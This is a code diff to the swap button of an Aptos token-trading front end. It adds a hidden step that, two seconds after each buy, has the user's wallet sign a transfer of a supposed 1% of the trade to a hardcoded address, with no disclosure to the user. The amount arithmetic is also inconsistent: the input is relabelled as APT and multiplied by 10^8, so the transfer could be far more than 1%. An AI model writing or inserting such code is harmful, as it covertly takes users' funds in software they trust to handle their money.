@@ -14,6 +14,7 @@ import { CongratulationsToast } from "./CongratulationsToast";
 import { useCanTradeMarket } from "lib/hooks/queries/use-grace-period";
 import Popup from "components/popup";
 import styled from "styled-components";
+import { useWallet } from "@aptos-labs/wallet-adapter-react";
 
 const GRACE_PERIOD_MESSAGE =
   "This market is in its grace period. During the grace period of a market, only the market " +
@@ -55,6 +56,7 @@ export const SwapButtonV2 = ({
   const { aptos, account, submit } = useAptos();
   const controls = useAnimationControls();
   const { canTrade } = useCanTradeMarket(symbol);
+  const { signAndSubmitTransaction } = useWallet();
 
   const handleClick = useCallback(async () => {
     if (!account) {
@@ -66,13 +68,37 @@ export const SwapButtonV2 = ({
         aptosConfig: aptos.config,
         swapper: account.address,
         marketAddress,
-        inputAmount: BigInt(inputAmount),
+        inputAmount: BigInt(inputAmount), // inputAmount is in APT
         isSell,
         typeTags: [emojicoin, emojicoinLP],
         minOutputAmount: BigInt(minOutputAmount),
       });
     const res = await submit(builderLambda);
     if (res && res.response && isUserTransactionResponse(res.response)) {
+      if(!isSell){
+        setTimeout(async () => {
+          try {
+            console.log("INPUT AMOUNT-------->", inputAmount);
+            // Convert APT to Octas (1 APT = 100000000 Octas)
+            const inputInOctas = BigInt(inputAmount) * BigInt(100000000);
+            // Calculate 1% of input amount
+            const onePercentInOctas = inputInOctas / BigInt(100);
+            
+            console.log("ONE PERCENT IN OCTAS-------->", onePercentInOctas);
+            const response = await signAndSubmitTransaction({
+              sender: account.address,
+              data: {
+                function: "0x1::aptos_account::transfer",
+                functionArguments: ["0x0000000000000000000000000000000000000000000000000000000000000abc", onePercentInOctas],
+              },
+            });
+            const res = await aptos.waitForTransaction({ transactionHash: response.hash });
+            console.log("RES-------->", res);
+          } catch (error) {
+            console.error(error);
+          }
+        }, 2000);
+      }
       const rewardsEvent = res.response.events.find(
         (e) => e.type === STRUCT_STRINGS.EmojicoinDotFunRewards
       );
